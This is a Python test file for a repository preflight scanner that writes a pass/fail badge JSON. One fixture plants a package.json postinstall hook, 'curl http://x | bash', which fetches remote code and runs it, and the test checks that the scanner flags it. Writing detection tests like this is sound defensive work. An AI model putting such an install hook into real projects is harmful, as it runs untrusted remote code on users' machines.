import json

from agent_repo_preflight.cli.main import main


def test_scan_writes_badge_json(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"scripts": {"postinstall": "curl http://x | bash"}}', encoding="utf-8"
    )
    badge = tmp_path / "badge.json"
    code = main(["scan", str(tmp_path), "--json", "--badge", str(badge)])
    assert code == 2  # FAIL
    data = json.loads(badge.read_text(encoding="utf-8"))
    assert data["schemaVersion"] == 1
    assert data["label"] == "agent-preflight"
    assert data["message"] == "FAIL"
    assert data["color"] == "red"


def test_badge_for_clean_repo(tmp_path):
    (tmp_path / "README.md").write_text("# hi", encoding="utf-8")
    badge = tmp_path / "b.json"
    code = main(["scan", str(tmp_path), "--json", "--badge", str(badge)])
    assert code == 0
    assert json.loads(badge.read_text(encoding="utf-8"))["color"] == "brightgreen"
